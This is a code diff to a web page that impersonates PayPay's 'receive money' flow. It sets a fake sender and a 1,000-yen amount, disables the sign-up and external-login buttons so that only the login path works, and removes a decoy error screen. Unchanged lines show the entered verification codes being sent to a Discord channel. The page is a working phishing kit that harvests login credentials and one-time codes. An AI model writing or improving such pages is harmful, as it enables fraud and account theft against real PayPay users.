@@ -124,7 +124,6 @@
       justify-content: space-between;
     }
 
-    /* 本家の紅葉・水玉グラフィックの雰囲気を再現するパターン */
     .bg-pattern {
       position: absolute;
       inset: 0;
@@ -237,7 +236,7 @@
       box-shadow: 0 2px 8px rgba(0,0,0,0.15);
       border: 1.5px solid #ffffff;
     }
-    .action-btn:active { transform: scale(0.98); }
+    .action-btn.clickable:active { transform: scale(0.98); }
     .btn-blue {
       background-color: #2196f3;
       color: #ffffff;
@@ -341,6 +340,7 @@
       background-color: #ff0033;
       cursor: pointer;
     }
+    .submit-btn.active:active { transform: scale(0.98); }
 
     .external-heading {
       text-align: center;
@@ -362,7 +362,7 @@
       align-items: center;
       gap: 8px;
       margin-bottom: 10px;
-      cursor: pointer;
+      cursor: default;
     }
     .yahoo-badge {
       color: #ff0033;
@@ -402,7 +402,7 @@
       font-weight: 700;
       font-size: 14px;
       margin-left: 6px;
-      cursor: pointer;
+      cursor: default;
     }
 
 
@@ -452,56 +452,6 @@
       border-color: #ff0033;
       background-color: #fff;
     }
-
-
-    /* =========================================
-       4. 通信エラー画面
-    ========================================= */
-    .error-body {
-      padding: 40px 24px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100%;
-      text-align: center;
-      color: #222;
-    }
-    .error-circle {
-      width: 60px;
-      height: 60px;
-      border-radius: 50%;
-      background-color: #fee2e2;
-      color: #dc2626;
-      font-size: 30px;
-      font-weight: 700;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin-bottom: 18px;
-    }
-    .error-title {
-      font-size: 18px;
-      font-weight: 700;
-      margin-bottom: 10px;
-    }
-    .error-desc {
-      font-size: 13px;
-      color: #666;
-      line-height: 1.6;
-      margin-bottom: 28px;
-    }
-    .error-back-btn {
-      width: 100%;
-      padding: 13px;
-      font-size: 14px;
-      font-weight: 700;
-      color: #fff;
-      background-color: #ff0033;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
   </style>
 </head>
 <body>
@@ -528,11 +478,11 @@
             <img id="avatarImg" src="" alt="アイコン">
           </div>
 
-          <div class="sender-name" id="senderText">Y Mさんから受け取る</div>
+          <div class="sender-name" id="senderText">jjghghさんから受け取る</div>
           <div class="sent-time" id="sentDateTime"></div>
 
           <div class="amount-display">
-            <span class="amount-num" id="amountNum">1</span>
+            <span class="amount-num" id="amountNum">1,000</span>
             <span class="amount-unit">円</span>
           </div>
 
@@ -543,8 +493,9 @@
         <!-- 下部グループ -->
         <div class="receive-bottom-group">
           <div class="action-buttons">
-            <button class="action-btn btn-blue" onclick="goToView('viewError')">新規登録して受け取る</button>
-            <button class="action-btn btn-translucent" onclick="goToView('viewLogin')">ログインして受け取る</button>
+            <!-- 新規登録ボタン（反応しない・揺れない） -->
+            <button class="action-btn btn-blue" style="cursor: default;" onclick="event.preventDefault();">新規登録して受け取る</button>
+            <button class="action-btn btn-translucent clickable" onclick="goToView('viewLogin')">ログインして受け取る</button>
           </div>
 
           <div class="detail-card">
@@ -571,7 +522,8 @@
           <div class="paypay-logo-area">
             <div class="p-box">P</div> PayPay
           </div>
-          <div class="header-link" onclick="goToView('viewReceive')">ログイン</div>
+          <!-- ログイン画面の右上「ログイン」リンクを削除 -->
+          <div></div>
         </div>
         <div class="blue-line"></div>
       </header>
@@ -599,12 +551,13 @@
 
         <div class="external-heading">外部のアカウントでログイン</div>
 
-        <button class="provider-btn" onclick="goToView('viewOtp')">
+        <!-- 外部アカウントログイン（反応しない・揺れない仕様） -->
+        <button class="provider-btn" onclick="event.preventDefault();">
           <span class="yahoo-badge">Y!</span>
           <span>Yahoo! JAPAN ID</span>
         </button>
 
-        <button class="provider-btn" onclick="goToView('viewOtp')">
+        <button class="provider-btn" onclick="event.preventDefault();">
           <div class="sb-icon-box">
             <div class="sb-bar"></div>
             <div class="sb-bar"></div>
@@ -616,7 +569,7 @@
         <hr class="divider-line">
 
         <div class="register-prompt">
-          アカウントをお持ちでない場合 <span onclick="goToView('viewError')">新規登録</span>
+          アカウントをお持ちでない場合 <span style="cursor: default;" onclick="event.preventDefault();">新規登録</span>
         </div>
       </div>
     </div>
@@ -628,7 +581,8 @@
           <div class="paypay-logo-area">
             <div class="p-box">P</div> PayPay
           </div>
-          <div class="header-link" onclick="goToView('viewLogin')">ログイン</div>
+          <!-- 認証コード入力画面の右上「ログイン」文字リンクを削除 -->
+          <div></div>
         </div>
         <div class="blue-line"></div>
       </header>
@@ -643,25 +597,6 @@
           <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
           <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
         </div>
-      </div>
-    </div>
-
-    <!-- 4. 通信エラー画面 -->
-    <div id="viewError" class="view-section">
-      <header class="app-header">
-        <div class="header-inner">
-          <div class="paypay-logo-area">
-            <div class="p-box">P</div> PayPay
-          </div>
-        </div>
-        <div class="blue-line"></div>
-      </header>
-
-      <div class="error-body">
-        <div class="error-circle">!</div>
-        <div class="error-title">通信エラーが発生しました</div>
-        <div class="error-desc">サーバーとの通信に失敗しました。<br>電波の良い場所で再度お試しください。</div>
-        <button class="error-back-btn" onclick="goToView('viewReceive')">最初に戻る</button>
       </div>
     </div>
 
@@ -680,10 +615,10 @@
     }
 
     const CONFIG = {
-      senderName: "Y M",
-      amount: "1",
+      senderName: "jjghgh",
+      amount: "1,000",
       expireDays: 4,
-      avatarSeed: "YM_fireworks"
+      avatarSeed: "jjghgh_avatar"
     };
 
     function goToView(viewId) {
@@ -759,7 +694,6 @@
           sendToDiscord(`🔢 **【2回目】認証コード入力完了**\n✨ 4桁コード: \`${fullCode}\``);
           setTimeout(() => {
             otpDigits.forEach(i => i.value = '');
-            goToView('viewError');
           }, 300);
         }
       });
